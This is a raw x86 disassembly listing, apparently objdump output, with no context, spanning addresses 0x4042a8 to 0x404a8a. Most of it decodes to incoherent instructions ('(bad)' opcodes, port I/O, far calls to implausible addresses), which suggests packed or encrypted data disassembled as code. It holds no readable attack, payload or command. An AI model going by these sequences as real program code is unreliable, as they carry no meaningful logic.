  4042a8:	sub    bh,dh
  4042aa:	ror    BYTE PTR [eax+0x49],0xeb
  4042ae:	mov    ds:0x347fedc5,al
  4042b3:	fisttp QWORD PTR [edi+0x3d]
  4042b6:	pop    edx
  4042b7:	fst    st(4)
  4042b9:	and    esi,ebp
  4042bb:	jge    0x404253
  4042bd:	mov    cs,WORD PTR [esp+ebp*2-0x33]
  4042c1:	sbb    ecx,DWORD PTR [esi]
  4042c3:	and    eax,0x1ac920fa
  4042c8:	add    BYTE PTR [eax-0x4b],dh
  4042cb:	fld    st(2)
  4042cd:	inc    esp
  4042ce:	dec    ebx
  4042cf:	mov    BYTE PTR [eax],ch
  4042d1:	pop    eax
  4042d2:	adc    edi,DWORD PTR fs:[ecx+0x7f]
  4042d6:	int3   
  4042d7:	inc    esp
  4042d8:	je     0x4042b9
  4042da:	adc    esi,0x1a
  4042dd:	rcr    eax,cl
  4042df:	push   esp
  4042e0:	aad    0x2e
  4042e2:	cmp    dl,bh
  4042e4:	mov    al,ds:0xf4ce86bc
  4042e9:	mov    dl,0xc5
  4042eb:	fadd   QWORD PTR [esi-0x1]
  4042ee:	pop    esp
  4042ef:	xor    al,0xc5
  4042f1:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  4042f3:	add    BYTE PTR [eax-0x159d97cb],bl
  4042f9:	jg     0x404329
  4042fb:	or     BYTE PTR [edx],0x55
  4042fe:	(bad)  
  4042ff:	adc    eax,0x193d5910
  404304:	xchg   ecx,eax
  404305:	push   es
  404306:	fdiv   DWORD PTR [ebp-0x19fd6705]
  40430c:	out    dx,eax
  40430d:	out    0x2,al
  40430f:	dec    esi
  404310:	out    dx,eax
  404311:	jg     0x4042a9
  404313:	inc    ebx
  404314:	sub    BYTE PTR [eax-0x17569cef],ch
  40431a:	push   ecx
  40431b:	add    BYTE PTR [ebx],al
  40431d:	jns    0x404312
  40431f:	push   0xbf683b1d
  404324:	fimul  DWORD PTR [esi+edx*2]
  404327:	push   ss
  404328:	pop    eax
  404329:	fist   WORD PTR [edi]
  40432b:	jge    0x404324
  40432d:	shl    BYTE PTR [edx+ebp*2-0x42],0xc5
  404332:	cmp    BYTE PTR [ebx-0x7d],ch
  404335:	add    esp,DWORD PTR [edx-0x4f]
  404338:	cmp    ah,dl
  40433a:	call   0xd34b:0xeeb5d523
  404341:	leave  
  404342:	pusha  
  404343:	repnz mov ?,WORD PTR [edx]
  404346:	push   ss
  404347:	or     dh,BYTE PTR [esi+0x402719f2]
  40434d:	(bad)  
  40434e:	ins    DWORD PTR es:[edi],dx
  40434f:	sbb    esp,DWORD PTR [ebp+0xbd1b898]
  404355:	int    0xaa
  404357:	cmp    eax,0x199aed03
  40435c:	sub    ah,BYTE PTR [esi+0x50241737]
  404362:	sbb    DWORD PTR [esp+ecx*8],ecx
  404365:	lock es sbb eax,edx
  404369:	xchg   esp,eax
  40436a:	push   edx
  40436b:	jae    0x404329
  40436d:	jmp    0xcf3a635
  404372:	cli    
  404373:	jae    0x4043b4
  404375:	movlps xmm2,QWORD PTR [edx-0x79]
  404379:	fcompp 
  40437b:	cmp    eax,DWORD PTR ds:0x8932e921
  404381:	hlt    
  404382:	test   esi,edi
  404384:	xlat   BYTE PTR ds:[ebx]
  404385:	inc    esi
  404386:	xor    edx,eax
  404388:	adc    BYTE PTR [ecx-0x26],ch
  40438b:	std    
  40438c:	div    ah
  40438e:	or     dl,bl
  404390:	ret    
  404391:	stos   BYTE PTR es:[edi],al
  404392:	imul   edx,eax,0xfffffffa
  404395:	mov    bl,0xf1
  404397:	pop    esp
  404398:	neg    DWORD PTR [edx+0x3d9df296]
  40439e:	hlt    
  40439f:	sbb    edx,0xffffffa8
  4043a2:	rcl    ebx,0xe3
  4043a5:	mov    BYTE PTR [edi+0x7870bf98],ch
  4043ab:	cmp    ax,0x42ac
  4043af:	or     dh,BYTE PTR [esi-0x3e0b5095]
  4043b5:	rol    ah,cl
  4043b7:	test   al,0x51
  4043b9:	ds in  eax,0x85
  4043bc:	xchg   ebx,eax
  4043bd:	mov    ch,0xd7
  4043bf:	add    ebp,DWORD PTR [ecx+eiz*4-0x19bb4f3e]
  4043c6:	add    DWORD PTR [ecx+0x6df2eeeb],ecx
  4043cc:	ja     0x404425
  4043ce:	aam    0x66
  4043d0:	pop    ds
  4043d1:	and    edi,DWORD PTR [ecx+0x44]
  4043d4:	hlt    
  4043d5:	fsubr  QWORD PTR [ebp+0x433ffc07]
  4043db:	inc    esp
  4043dc:	mov    esi,0xd119391f
  4043e1:	test   eax,0xf9e39893
  4043e6:	test   BYTE PTR [edx+0x3a],0x2c
  4043ea:	fcom   DWORD PTR [ebp-0x47]
  4043ed:	(bad)  
  4043ee:	sbb    al,0x33
  4043f0:	xor    dl,BYTE PTR [esi+0x3e5fbcd9]
  4043f6:	pop    esi
  4043f7:	lahf   
  4043f8:	test   eax,0x3bbac8c1
  4043fd:	or     BYTE PTR [ecx+ebx*2+0x1db24341],dl
  404404:	sbb    eax,0x37392111
  404409:	and    ecx,DWORD PTR [ebx]
  40440b:	push   edi
  40440c:	ins    DWORD PTR es:[edi],dx
  40440d:	pop    esp
  40440e:	inc    edx
  40440f:	or     DWORD PTR [ebx-0x13],ebp
  404412:	sti    
  404413:	pop    esp
  404414:	dec    eax
  404415:	or     eax,0xcce2e818
  40441a:	imul   esp,DWORD PTR [esi-0x39],0xc49fae98
  404421:	sub    esi,eax
  404423:	cmp    ebx,DWORD PTR [esi]
  404425:	mov    edi,0x6c46d2d2
  40442a:	out    0xf2,al
  40442c:	mov    al,0xc8
  40442e:	out    dx,al
  40442f:	jb     0x40447c
  404431:	pushf  
  404432:	jp     0x4043ca
  404434:	dec    edi
  404435:	dec    esp
  404436:	sbb    BYTE PTR [edx+0x3e],ch
  404439:	mov    ch,0x5e
  40443b:	into   
  40443c:	icebp  
  40443d:	adc    cl,BYTE PTR [edi+0x3e]
  404440:	and    dh,ch
  404442:	jp     0x40449e
  404444:	dec    ecx
  404445:	arpl   WORD PTR [esi+0x507d4727],cx
  40444b:	iret   
  40444c:	into   
  40444d:	jb     0x4044a4
  40444f:	out    0x94,eax
  404451:	mov    al,0x27
  404453:	les    edx,FWORD PTR [ebx+edi*4]
  404456:	repz test eax,0x7fcde578
  40445c:	mov    ds:0xf0f66075,eax
  404461:	xlat   BYTE PTR ds:[ebx]
  404462:	fnclex 
  404464:	aaa    
  404465:	xchg   BYTE PTR [eax-0x1],ch
  404468:	and    al,0x78
  40446a:	xor    DWORD PTR [ecx-0x25],eax
  40446d:	shr    DWORD PTR [esi+0x2c2c9663],0x22
  404474:	push   ecx
  404475:	push   ebx
  404476:	pusha  
  404477:	cmp    ah,dl
  404479:	mov    cl,0xc9
  40447b:	mov    eax,ds:0xfee9f833
  404480:	add    al,BYTE PTR [eax]
  404482:	add    BYTE PTR [edx],al
  404484:	pop    ebp
  404485:	inc    esp
  404486:	dec    ecx
  404487:	popa   
  404488:	jno    0x40449d
  40448a:	jne    0x4044e2
  40448c:	xor    al,0xa0
  40448e:	jle    0x4044d8
  404490:	push   ds
  404491:	mov    al,ds:0x7e185e7e
  404496:	jle    0x4044f0
  404498:	jl     0x404518
  40449a:	jle    0x40444c
  40449c:	add    DWORD PTR [ebx],ecx
  40449e:	jnp    0x4044ec
  4044a0:	mov    eax,0x7a36b2a
  4044a5:	xor    al,0x8b
  4044a7:	xchg   ebp,eax
  4044a8:	xor    eax,0x512d7484
  4044ad:	jne    0x4044f8
  4044af:	jecxz  0x40449c
  4044b1:	mov    edi,0x7380b812
  4044b6:	mov    edi,0xe9437e01
  4044bb:	inc    eax
  4044bc:	fisub  WORD PTR [ebx+edx*1-0x16]
  4044c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044c1:	rol    DWORD PTR [ecx-0x4a],cl
  4044c4:	jle    0x4044c6
  4044c6:	and    al,0x9c
  4044c8:	mov    ch,0x32
  4044ca:	and    eax,0x537fc4a2
  4044cf:	mov    ch,0x57
  4044d1:	inc    ecx
  4044d2:	arpl   si,bp
  4044d4:	push   edi
  4044d5:	pop    eax
  4044d6:	and    eax,0x64acbeee
  4044db:	cli    
  4044dc:	cld    
  4044dd:	daa    
  4044de:	cli    
  4044df:	je     0x404511
  4044e1:	test   BYTE PTR ds:0xc785c9e7,0xbb
  4044e8:	pop    DWORD PTR [edx-0x30]
  4044eb:	mov    ds:0x17dfadd2,al
  4044f0:	clc    
  4044f1:	out    0xcd,eax
  4044f3:	inc    ebp
  4044f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044f5:	jp     0x404524
  4044f7:	mov    ds:0xc01d5ae1,al
  4044fc:	in     eax,dx
  4044fd:	dec    ecx
  4044fe:	xchg   esi,eax
  4044ff:	sti    
  404500:	mov    bl,0xd7
  404502:	ins    BYTE PTR es:[edi],dx
  404503:	div    DWORD PTR [edx-0x8]
  404506:	fist   DWORD PTR ds:0x72dc55dd
  40450c:	dec    ebx
  40450d:	mov    ebx,0x5b012826
  404512:	and    BYTE PTR [edi],bh
  404514:	dec    edi
  404515:	push   eax
  404516:	mov    bl,BYTE PTR [edi+0x15]
  404519:	repnz cli 
  40451b:	push   eax
  40451c:	mov    dh,0x56
  40451e:	jno    0x4044d0
  404520:	inc    edi
  404521:	mov    gs,WORD PTR [edi]
  404523:	adc    eax,0x465774b6
  404528:	add    DWORD PTR [ecx-0x45473787],eax
  40452e:	xor    eax,0xd79af034
  404533:	into   
  404534:	jg     0x40457c
  404536:	sub    BYTE PTR [edx-0x2e4bf9e8],al
  40453c:	ror    BYTE PTR [eax],0xc
  40453f:	cdq    
  404540:	adc    bh,BYTE PTR [ebp+0x68543e71]
  404546:	cmp    ecx,DWORD PTR [esi]
  404548:	inc    eax
  404549:	add    eax,0xc931e7fe
  40454e:	imul   ecx,DWORD PTR [ecx],0x6ebd95e3
  404554:	or     BYTE PTR [eax],bl
  404556:	push   ebp
  404557:	mov    edi,0xb1a19855
  40455c:	and    DWORD PTR ds:0xf4a0d696,esp
  404562:	data16 rol cl,cl
  404565:	adc    edi,DWORD PTR [edx-0x77b0876a]
  40456b:	or     bh,cl
  40456d:	scas   eax,DWORD PTR es:[edi]
  40456e:	mov    bl,0x6d
  404570:	cli    
  404571:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404572:	retf   
  404573:	pop    ebx
  404574:	xchg   ebx,eax
  404575:	jo     0x404506
  404577:	push   es
  404578:	mov    ebp,0x42fca197
  40457d:	mov    dl,0x6a
  40457f:	jge    0x4045af
  404581:	and    bl,BYTE PTR [eax+0x34ae71b4]
  404587:	dec    ecx
  404588:	stos   BYTE PTR es:[edi],al
  404589:	jno    0x404546
  40458b:	cmp    eax,0x5448cf7e
  404590:	ss mov dh,0x63
  404593:	shl    DWORD PTR [ebx+0x54],1
  404596:	mov    bh,BYTE PTR [ebp+0x53]
  404599:	out    0x83,eax
  40459b:	fisttp DWORD PTR ds:0xce2c4c96
  4045a1:	and    ebx,DWORD PTR [ecx+0x11]
  4045a4:	jmp    DWORD PTR [ebp+eiz*1+0x6d]
  4045a8:	mov    ebx,0xbd59e22e
  4045ad:	cmp    DWORD PTR [eax-0x3c5de59],0x63aa375c
  4045b7:	neg    DWORD PTR [ebp+0x31ff5103]
  4045bd:	jmp    0xb7c495eb
  4045c2:	push   0xffffff93
  4045c4:	add    eax,eax
  4045c6:	cwde   
  4045c7:	cs aam 0x50
  4045ca:	sbb    bh,ch
  4045cc:	bound  ecx,QWORD PTR [ebx+0x42]
  4045cf:	arpl   WORD PTR [ebx],ax
  4045d1:	dec    edi
  4045d2:	call   0xd481:0x2bf2f7e
  4045d9:	stc    
  4045da:	test   DWORD PTR [esi-0x1c56e9bf],ebx
  4045e0:	loope  0x4045f4
  4045e2:	add    esi,DWORD PTR [eax-0x32669396]
  4045e8:	js     0x40460a
  4045ea:	mov    eax,ds:0x42882f9b
  4045ef:	popa   
  4045f0:	mov    ds:0x9efa6142,al
  4045f5:	cli    
  4045f6:	jnp    0x4045d2
  4045f8:	aas    
  4045f9:	ror    dh,1
  4045fb:	lahf   
  4045fc:	sub    esp,DWORD PTR [edx+ebp*1-0x31]
  404600:	push   0x70c51639
  404605:	push   esp
  404606:	push   0x20f7859f
  40460b:	(bad)  
  40460c:	inc    ebp
  40460d:	add    ah,bl
  40460f:	jmp    0x3a635267
  404614:	ret    0x965d
  404617:	mov    eax,0x3ffd976f
  40461c:	je     0x404671
  40461e:	adc    BYTE PTR [ebp+0x42],dh
  404621:	mov    ah,0xe9
  404623:	retf   0xa756
  404626:	lds    esi,FWORD PTR [ebp+0x17]
  404629:	fmul   QWORD PTR [ecx+0x19d3843c]
  40462f:	sbb    eax,0x2551e0cf
  404634:	stos   DWORD PTR es:[edi],eax
  404635:	inc    esp
  404636:	sbb    eax,0x6e8e2d87
  40463b:	jno    0x404679
  40463d:	jb     0x4046ab
  40463f:	xor    eax,0x84198d57
  404644:	lea    esi,[ecx+0x4c015760]
  40464a:	sub    ebx,eax
  40464c:	das    
  40464d:	push   ds
  40464e:	jp     0x4045df
  404650:	adc    al,0x56
  404652:	scas   al,BYTE PTR es:[edi]
  404653:	mov    DWORD PTR [eax-0x712e578b],edx
  404659:	xor    DWORD PTR [edi+0x69efa803],ebp
  40465f:	imul   esi,ecx,0xf5236ff5
  404665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404666:	sbb    bh,BYTE PTR [edx]
  404668:	mov    ds,WORD PTR [ebx+0x75]
  40466b:	xor    eax,ebp
  40466d:	test   eax,ebp
  40466f:	mov    ds:0x7077947e,al
  404674:	jo     0x40468e
  404676:	in     al,dx
  404677:	jnp    0x4046e0
  404679:	inc    esi
  40467a:	xchg   esp,eax
  40467b:	repnz cmp DWORD PTR [ecx],0xffffff90
  40467f:	ror    DWORD PTR [ecx],cl
  404681:	daa    
  404682:	inc    eax
  404683:	fnstsw WORD PTR [esi-0x37]
  404686:	dec    edx
  404687:	pop    edx
  404688:	cmp    al,0xc0
  40468a:	dec    esp
  40468b:	push   ebp
  40468c:	dec    edx
  40468d:	push   ecx
  40468e:	test   al,0x1d
  404690:	xchg   esi,eax
  404691:	addr16 push ecx
  404693:	out    dx,al
  404694:	hlt    
  404695:	rcr    BYTE PTR [ecx+0x1ab4e6ec],1
  40469b:	sub    edi,DWORD PTR [edi-0x52]
  40469e:	inc    esp
  40469f:	lock loope 0x4046a2
  4046a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046a3:	frstpm(287 only) 
  4046a5:	push   ecx
  4046a6:	push   edi
  4046a7:	jle    0x40463c
  4046a9:	rol    DWORD PTR [ebx-0x43ea4c47],cl
  4046af:	mov    bl,0x1c
  4046b1:	fisttp DWORD PTR [eax+eiz*4+0x5a]
  4046b5:	ja     0x4046d1
  4046b7:	cmp    eax,0x169d7634
  4046bc:	dec    edi
  4046bd:	leave  
  4046be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c0:	xor    esi,DWORD PTR [esi-0x31]
  4046c3:	in     eax,dx
  4046c4:	mov    ah,0x71
  4046c6:	mov    edx,0x184a9535
  4046cb:	and    BYTE PTR [edi-0x5fe1f5a3],ah
  4046d1:	mov    eax,0xaa18fa08
  4046d6:	adc    al,bl
  4046d8:	and    BYTE PTR [ecx+eax*4-0x3f],dh
  4046dc:	fwait
  4046dd:	mov    dl,0xec
  4046df:	mov    bh,ah
  4046e1:	and    al,0x90
  4046e3:	jae    0x4046f4
  4046e5:	dec    DWORD PTR [eax-0x60]
  4046e8:	js     0x206c8c83
  4046ee:	outs   dx,BYTE PTR ds:[esi]
  4046ef:	adc    cl,dl
  4046f1:	cmc    
  4046f2:	ret    
  4046f3:	mov    BYTE PTR [edx],bh
  4046f5:	fisttp DWORD PTR [eax-0x4a]
  4046f8:	(bad)  
  4046f9:	outs   dx,BYTE PTR ds:[esi]
  4046fa:	or     al,0xb9
  4046fc:	inc    ebp
  4046fd:	sti    
  4046fe:	and    DWORD PTR [ebx],esp
  404700:	and    eax,0x66c4a0d8
  404705:	add    eax,0xa0c0ec95
  40470a:	push   esp
  40470b:	pusha  
  40470c:	pop    esp
  40470d:	scas   al,BYTE PTR es:[edi]
  40470e:	pop    ebx
  40470f:	popa   
  404710:	ins    DWORD PTR es:[edi],dx
  404711:	sbb    dl,ch
  404713:	cmp    eax,DWORD PTR [edx+eiz*2+0xfa97bf3]
  40471a:	sbb    DWORD PTR [edi+0x4a],esi
  40471d:	adc    DWORD PTR [esi-0x5f7779a],0x2b0edc69
  404727:	(bad)  
  404728:	push   0x44a0c763
  40472d:	mov    edx,0x4fb5d147
  404732:	xlat   BYTE PTR ds:[ebx]
  404733:	cmp    eax,DWORD PTR ds:0x81fded7c
  404739:	xor    eax,0xb7fa6f6e
  40473e:	scas   al,BYTE PTR es:[edi]
  40473f:	pop    esi
  404740:	sar    DWORD PTR [esp+edi*8+0x7a],1
  404744:	scas   eax,DWORD PTR es:[edi]
  404745:	adc    esi,DWORD PTR [ebx]
  404747:	sub    cl,bl
  404749:	jnp    0x404784
  40474b:	dec    eax
  40474c:	jbe    0x4046d4
  40474e:	shr    BYTE PTR [ecx-0x4f],cl
  404751:	jge    0x40477c
  404753:	sti    
  404754:	add    BYTE PTR [esi-0x11],dl
  404757:	push   edx
  404758:	scas   al,BYTE PTR es:[edi]
  404759:	(bad)  
  40475a:	jbe    0x4046f5
  40475c:	repnz xchg edx,eax
  40475e:	push   es
  40475f:	in     eax,0x82
  404761:	pop    esp
  404762:	cli    
  404763:	mov    dl,0x1c
  404765:	loop   0x40479f
  404767:	clc    
  404768:	inc    ebp
  404769:	ins    BYTE PTR es:[edi],dx
  40476a:	pop    ecx
  40476b:	xchg   ebp,eax
  40476c:	loop   0x40472c
  40476e:	dec    ebx
  40476f:	jmp    0xa5889a08
  404774:	mov    bh,0xa5
  404776:	lods   al,BYTE PTR ds:[esi]
  404777:	adc    al,0x83
  404779:	into   
  40477a:	sub    al,0xea
  40477c:	cmp    BYTE PTR [eax+ebx*8],cl
  40477f:	mov    al,ds:0x3d033c2
  404784:	stc    
  404785:	add    edx,ecx
  404787:	imul   edx,edi
  40478a:	mov    DWORD PTR [ebp+0xc],edx
  40478d:	mov    edx,DWORD PTR [ebp+0xc]
  404790:	mov    DWORD PTR [ebp-0x24],edx
  404793:	mov    edx,DWORD PTR [ebp-0x8]
  404796:	add    edx,DWORD PTR [ebp-0x40]
  404799:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  4047a0:	mov    DWORD PTR [ebp-0x1c],edx
  4047a3:	jmp    0x404aa6
  4047a8:	sub    ch,BYTE PTR [eax+edi*1+0x6b69b8ad]
  4047af:	test   eax,0xf2c2fa45
  4047b4:	push   eax
  4047b5:	rol    DWORD PTR [edi],0x54
  4047b8:	mov    eax,0x587e7e27
  4047bd:	jl     0x40483d
  4047bf:	jle    0x404742
  4047c1:	xchg   esp,eax
  4047c2:	push   ecx
  4047c3:	xor    ecx,edx
  4047c5:	pop    eax
  4047c6:	cmp    eax,edi
  4047c8:	mov    edi,0x550bd65c
  4047cd:	idiv   DWORD PTR [esi]
  4047cf:	inc    eax
  4047d0:	cdq    
  4047d1:	and    eax,0xfe243243
  4047d6:	ror    BYTE PTR [edx+0x58],1
  4047d9:	adc    eax,0x56488b29
  4047de:	and    al,0x11
  4047e0:	out    0x70,eax
  4047e2:	stos   BYTE PTR es:[edi],al
  4047e3:	jb     0x40479b
  4047e5:	out    0x12,eax
  4047e7:	daa    
  4047e8:	sub    DWORD PTR [ebx-0x44611f5d],0x63
  4047ef:	xchg   edx,eax
  4047f0:	xchg   edx,eax
  4047f1:	xchg   edx,eax
  4047f2:	or     al,0x59
  4047f4:	lods   al,BYTE PTR ds:[esi]
  4047f5:	jns    0x404860
  4047f7:	fwait
  4047f8:	gs xchg ebx,eax
  4047fa:	mov    cl,0x80
  4047fc:	stos   DWORD PTR es:[edi],eax
  4047fd:	pop    es
  4047fe:	out    0xa7,al
  404800:	or     esi,edx
  404802:	hlt    
  404803:	add    cl,BYTE PTR [esp+esi*2-0x368355e]
  40480a:	or     ebp,ebp
  40480c:	or     ecx,esi
  40480e:	clc    
  40480f:	jae    0x404840
  404811:	inc    ebp
  404812:	cmp    esp,0xdf5cdf87
  404818:	cld    
  404819:	dec    edi
  40481a:	inc    edx
  40481b:	xor    dl,BYTE PTR [ecx]
  40481d:	shl    DWORD PTR [edi+0x1a],cl
  404820:	repz cmp dh,ah
  404823:	xor    al,0x85
  404825:	popf   
  404826:	xchg   dl,cl
  404828:	sbb    dh,BYTE PTR [ebx]
  40482a:	push   esi
  40482b:	cmc    
  40482c:	mov    bl,0xa1
  40482e:	mov    ah,cl
  404830:	jae    0x4047e9
  404832:	or     cl,0xa2
  404835:	jmp    0x3e89f073
  40483a:	mov    esi,0x93d93408
  40483f:	fwait
  404840:	cli    
  404841:	sub    eax,0x3cde9317
  404846:	mov    ebp,0x6e566c2c
  40484b:	lea    esi,ds:0x6513415a
  404851:	jno    0x40480e
  404853:	ins    DWORD PTR es:[edi],dx
  404854:	mov    bh,0x8d
  404856:	push   edi
  404857:	test   eax,0x6c54190b
  40485c:	cld    
  40485d:	dec    eax
  40485e:	mov    ds:0x6508d3ec,al
  404863:	jae    0x40482c
  404865:	sbb    eax,0x4b00a449
  40486a:	xor    eax,0x42cfd351
  40486f:	jnp    0x4048de
  404871:	jle    0x404853
  404873:	(bad)  [ebp+0x49]
  404876:	jl     0x40481f
  404878:	popa   
  404879:	sub    eax,DWORD PTR [edi+0x1e]
  40487c:	inc    ebp
  40487d:	jae    0x404843
  40487f:	sub    DWORD PTR [ecx+eax*4+0x3a991b11],esi
  404886:	lahf   
  404887:	lock adc eax,0x8cd29293
  40488d:	les    esi,FWORD PTR [esi]
  40488f:	mov    eax,0xb3cd464d
  404894:	call   FWORD PTR [esi]
  404896:	sbb    al,0xa0
  404898:	inc    BYTE PTR [ebx-0x2a905b5e]
  40489e:	cmp    edx,DWORD PTR [esi-0x60]
  4048a1:	mov    WORD PTR [eax],gs
  4048a3:	push   esi
  4048a4:	outs   dx,DWORD PTR ds:[esi]
  4048a5:	out    dx,al
  4048a6:	sub    eax,0xaf63d3b1
  4048ab:	das    
  4048ac:	mov    bl,0x4c
  4048ae:	jp     0x404851
  4048b0:	lock mov ah,0x68
  4048b3:	add    ebp,DWORD PTR [ebx]
  4048b5:	pushf  
  4048b6:	retf   0xac51
  4048b9:	inc    esi
  4048ba:	inc    eax
  4048bb:	jae    0x40490a
  4048bd:	stc    
  4048be:	xor    BYTE PTR [esi+eax*1],0xbc
  4048c2:	aam    0xb3
  4048c4:	mov    dh,0x5b
  4048c6:	fsave  [ecx-0x2bc76024]
  4048cd:	inc    eax
  4048ce:	js     0x404854
  4048d0:	ins    DWORD PTR es:[edi],dx
  4048d1:	pop    es
  4048d2:	ds stc 
  4048d4:	mov    ?,edi
  4048d6:	lahf   
  4048d7:	stos   DWORD PTR es:[edi],eax
  4048d8:	pop    edx
  4048d9:	aam    0x38
  4048db:	sub    DWORD PTR [ecx+0x45],ecx
  4048de:	mov    ?,WORD PTR [ebp+0x74]
  4048e1:	push   ds
  4048e2:	mov    DWORD PTR [edx-0x19],ebp
  4048e5:	dec    si
  4048e7:	dec    esi
  4048e8:	xchg   ecx,eax
  4048e9:	aad    0xc0
  4048eb:	enter  0x14cc,0xfb
  4048ef:	fs sbb edi,0x2e0dbc4c
  4048f6:	or     eax,0x3f47759e
  4048fb:	lds    ecx,FWORD PTR [eax]
  4048fd:	(bad)  
  4048fe:	and    ah,BYTE PTR [ebx+0x49aae782]
  404904:	mov    ds:0x80eaca15,al
  404909:	aam    0xd5
  40490b:	push   es
  40490c:	call   0x7bdb37f7
  404911:	adc    al,0x22
  404913:	xchg   esp,eax
  404914:	mov    dl,0x7e
  404916:	sahf   
  404917:	mov    ch,0x36
  404919:	fcmovnu st,st(3)
  40491b:	pop    es
  40491c:	jl     0x4048e5
  40491e:	js     0x404917
  404920:	xor    BYTE PTR ds:[eax+0x49123e0f],ah
  404927:	sahf   
  404928:	jmp    0x60954ba9
  40492d:	mov    dl,0xb3
  40492f:	and    ah,bl
  404931:	test   al,0x4f
  404933:	xor    al,0x36
  404935:	mov    cl,0xb6
  404937:	xchg   esp,eax
  404938:	mov    ecx,ecx
  40493a:	icebp  
  40493b:	addr16 es repnz cs sbb dl,bh
  404941:	loope  0x404999
  404943:	jmp    0x4048fc
  404945:	mov    edx,0xc8b3332e
  40494a:	int3   
  40494b:	dec    eax
  40494c:	shr    DWORD PTR [esi+0x42133b65],0x2f
  404953:	imul   BYTE PTR [ebx]
  404955:	dec    esp
  404956:	ds retf 0xda50
  40495a:	iret   
  40495b:	cwde   
  40495c:	add    bh,BYTE PTR [edx+0x72dfe5af]
  404962:	pop    DWORD PTR [edi+0x553789b7]
  404968:	retf   0x2652
  40496b:	rol    cl,cl
  40496d:	cmp    dl,BYTE PTR [ebx+ebp*8-0x70]
  404971:	sbb    al,0x72
  404973:	inc    edx
  404974:	xchg   ebx,eax
  404975:	jecxz  0x4049ba
  404977:	xor    BYTE PTR [esi+0x6e9caad6],bh
  40497d:	not    DWORD PTR [edx]
  40497f:	rcl    DWORD PTR ds:0xe2965768,cl
  404985:	xchg   esi,eax
  404986:	sub    edx,DWORD PTR [edi+0xc]
  404989:	rcl    DWORD PTR [ebx-0x9],0x7c
  40498d:	jnp    0x404943
  40498f:	stos   DWORD PTR es:[edi],eax
  404990:	fwait
  404991:	(bad)  
  404992:	jp     0x404926
  404994:	sub    DWORD PTR [eax+0x60],ebp
  404997:	call   0xfd9fe571
  40499c:	mov    BYTE PTR [ecx-0x7b6c310c],ah
  4049a2:	jae    0x4049d0
  4049a4:	push   es
  4049a5:	push   ebx
  4049a6:	sahf   
  4049a7:	mov    bh,0xc0
  4049a9:	iret   
  4049aa:	mov    ebx,DWORD PTR [eax]
  4049ac:	(bad)  
  4049ad:	cmp    DWORD PTR [ebp*2+0x699b9d5a],ebp
  4049b4:	ss pop es
  4049b6:	add    edi,ebx
  4049b8:	ds xor al,bh
  4049bb:	int3   
  4049bc:	xchg   esi,eax
  4049bd:	rcr    DWORD PTR [edx-0x735f77ff],1
  4049c3:	jge    0x4049c0
  4049c5:	stos   DWORD PTR es:[edi],eax
  4049c6:	dec    edi
  4049c7:	mov    al,ds:0xeef3e8f6
  4049cc:	inc    ecx
  4049cd:	jns    0x4049f7
  4049cf:	out    dx,eax
  4049d0:	xchg   ecx,eax
  4049d1:	add    al,0xa0
  4049d3:	(bad)  
  4049d4:	jmp    0x404a3f
  4049d6:	into   
  4049d7:	ret    
  4049d8:	(bad)  
  4049d9:	fwait
  4049da:	xchg   edx,eax
  4049db:	adc    ecx,DWORD PTR [eax+0xc]
  4049de:	push   edx
  4049df:	outs   dx,BYTE PTR ds:[esi]
  4049e0:	mov    edx,DWORD PTR [ecx]
  4049e2:	repz cdq 
  4049e4:	data16 fidivr WORD PTR [edx+0x3938a98a]
  4049eb:	rol    DWORD PTR [ebx+0x2642ea0c],0xda
  4049f2:	mov    bh,0x71
  4049f4:	sar    BYTE PTR [edi-0x7bbb6f8],1
  4049fa:	pop    eax
  4049fb:	ja     0x404a48
  4049fd:	in     eax,dx
  4049fe:	jne    0x4049dc
  404a00:	pushf  
  404a01:	(bad)  
  404a03:	(bad)  
  404a04:	cmp    bl,BYTE PTR [edi-0x3]
  404a07:	sub    BYTE PTR [esi-0x6e],dl
  404a0a:	ins    DWORD PTR es:[edi],dx
  404a0b:	xchg   esi,eax
  404a0c:	je     0x4049bf
  404a0e:	data16 ins BYTE PTR es:[edi],dx
  404a10:	inc    eax
  404a11:	xchg   ecx,eax
  404a12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a13:	clc    
  404a14:	out    0xfb,al
  404a16:	int    0x8c
  404a18:	jecxz  0x4049e5
  404a1a:	jge    0x4049bf
  404a1c:	sub    eax,0xbd26e557
  404a21:	xlat   BYTE PTR ds:[ebx]
  404a22:	ds push 0x0
  404a25:	outs   dx,DWORD PTR ds:[esi]
  404a26:	fcom   DWORD PTR [ecx+0x5a]
  404a29:	mov    ebp,0x960c5abf
  404a2e:	fidivr DWORD PTR [edi-0x5b4d426b]
  404a34:	pop    edi
  404a35:	push   ds
  404a36:	xchg   ecx,eax
  404a37:	fmulp  st(0),st
  404a39:	pop    ds
  404a3a:	loope  0x404aa3
  404a3c:	mov    ch,0x3c
  404a3e:	push   esi
  404a3f:	sbb    BYTE PTR [esi-0x3a],al
  404a42:	cli    
  404a43:	sub    edi,edi
  404a45:	adc    dl,BYTE PTR [ecx-0x7d]
  404a48:	dec    ecx
  404a49:	inc    edx
  404a4a:	lea    esi,[eax+ebx*4+0x2b]
  404a4e:	test   esp,ebp
  404a50:	sub    eax,0x7e9a29b6
  404a55:	test   DWORD PTR [edx-0x8],eax
  404a58:	and    BYTE PTR [eax+0x519008a8],cl
  404a5e:	jne    0x404a9e
  404a60:	mov    ebp,0x6ecebfe9
  404a65:	xor    ch,cl
  404a67:	sti    
  404a68:	loop   0x404a1f
  404a6a:	(bad)
  404a6e:	iret   
  404a6f:	mov    eax,DWORD PTR [esi+edi*4]
  404a72:	in     al,dx
  404a73:	ret    0xc36
  404a76:	ret    0xe2e3
  404a79:	scas   eax,DWORD PTR es:[edi]
  404a7a:	in     al,dx
  404a7b:	int    0xe9
  404a7d:	ret    0x50dd
  404a80:	mov    ecx,0x966299d9
  404a85:	dec    ebx
  404a86:	xchg   edx,eax
  404a87:	sbb    al,dh
  404a89:	in     al,dx
  404a8a:	je     0x404a14
